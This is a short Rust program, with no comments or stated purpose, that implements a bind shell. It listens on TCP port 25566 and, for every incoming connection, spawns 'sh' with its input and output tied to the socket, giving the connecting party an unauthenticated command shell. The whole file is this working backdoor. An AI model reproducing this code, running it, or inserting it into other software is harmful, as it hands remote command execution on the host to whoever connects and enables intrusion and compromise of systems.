
use std::net::{TcpListener, TcpStream};
use std::thread;
use std::io::{Write, Read};
use std::process::{Command, Stdio};
use std::os::unix::io::{AsRawFd, FromRawFd};

unsafe fn handle_client(mut stream: TcpStream) {
    stream.write("Got your connection\n".as_bytes()).unwrap();

    Command::new("sh")
        .stdin(Stdio::from_raw_fd(stream.as_raw_fd()))
        .stdout(Stdio::from_raw_fd(stream.as_raw_fd()))
        .stderr(Stdio::from_raw_fd(stream.as_raw_fd()))
        .spawn()
        .expect("Could not create a shell");
}

fn main() {

    let listener = TcpListener::bind("127.0.0.1:25566").unwrap();

    for connection in listener.incoming() {
        match connection {
            Ok(stream) => {
                thread::spawn(|| unsafe {
                    handle_client(stream);
                });
            }
            Err(e) => panic!(e), 
        }
    }
}
